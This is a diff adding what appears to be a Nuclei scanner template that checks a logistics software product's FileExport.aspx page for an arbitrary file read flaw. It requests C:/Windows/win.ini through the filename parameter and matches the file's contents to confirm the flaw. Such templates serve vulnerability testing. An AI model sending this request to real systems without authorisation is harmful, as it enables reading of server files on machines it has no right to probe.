@@ -1,0 +1,23 @@
+id: dongshengwuliu-FileExport_aspx-File-reading
+
+info:
+  name: 东胜物流软件 FileExport.aspx 任意文件读取漏洞
+  author: dongshengwuliu
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /Reports/FileExport.aspx?filename=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+        condition: and
+      - type: status
+        status: 
+          - 200
